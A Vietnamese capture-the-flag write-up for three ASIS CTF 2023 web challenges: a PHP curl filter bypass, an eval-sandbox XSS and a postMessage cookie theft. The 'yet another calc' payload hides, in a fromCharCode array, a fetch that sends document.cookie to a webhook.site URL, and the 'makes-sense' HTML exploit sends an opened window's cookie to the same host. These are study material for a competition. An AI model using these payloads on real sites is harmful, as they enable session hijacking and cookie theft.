# **ASISCTF_2023**

## **Hello**

- Mở trang web ta thấy những thông tin như sau:

![](./img_asis/Screenshot%202023-10-03%20091404.png)

- Nó sẽ kiểm tra tồn tại key hay không với hàm "array_key_exists".
- Kiểm tra xem trong biến x có chứ chuỗi `'file'` và `'next` hay không. Nếu không chứa chuỗi nó sẽ tiếp tục thực hiện system curl.
- Vậy phương án tôi đưa ra để bypass là sử dụng url globbing như sau:

![](./img_asis/Screenshot%202023-10-03%20091914.png)

- Chúng ta sẽ truy cập đến những thông tin nó đã cho:

![](./img_asis/Screenshot%202023-10-03%20092150.png)

- Chúng ta sẽ đọc file /app/index.js

![](./img_asis/Screenshot%202023-10-03%20092503.png)

![](./img_asis/Screenshot%202023-10-03%20092503.png)

- Bây h chúng ta phải bypass hàm basename như sau:

![](./img_asis/Screenshot%202023-10-03%20092901.png)

- Từ đấy, ta nhận được flag như sau: `ASIS{good_job_bun} `

## **yet another calc**

- Sau khi đọc source đề ra chúng ta biết rằng phải tấn công XSS qua eval để lấy cookie của admin có chứa flag.

- Để làm và bổ sung kiến thức chúng ta tìm hiểu đường link sau: `https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/__defineGetter__`

- Tôi thực hiện khai thác như sau:
```javascript
c=Math.constructor
c=c.name
c=c.constructor
c=c.fromCharCode
Math.__defineGetter__(Math.aa,c)
Math.__defineGetter__(c.name,Math.__lookupGetter__)
v = Math.fromCharCode(102,101,116,99,104,40,96,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,57,99,49,53,100,54,57,56,45,97,57,102,49,45,52,54,57,98,45,56,55,97,52,45,101,100,50,56,100,102,57,100,48,50,50,53,63,99,109,100,61,96,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41)
c=Math.constructor
c=c.constructor
Math.__defineGetter__(Math.aa,c)
Math.__defineGetter__(c.name,Math.__lookupGetter__)
z=Math.Function(v)
Math.__defineGetter__(c.name,z)
Math.Function
```


## **makes-sense**
```html
<div id="atk"></div>
<script>
const target = 'http://45.147.229.128:8001/'
const s = atk.attachShadow({ mode: "closed" });
let f = document.createElement('div')
f.innerHTML = `<iframe src="${target}" name=wow onload="ld(event)" ></iframe>`
s.appendChild(f)
function ld(e){
	e.target.contentWindow.postMessage(`
    let x = window.open('/')
    setTimeout(()=>{
	   fetch("https://webhook.site/9c15d698-a9f1-469b-87a4-ed28df9d0225?a="+x.document.cookie)
    },1000)
    `,'*')
}
</script>
```
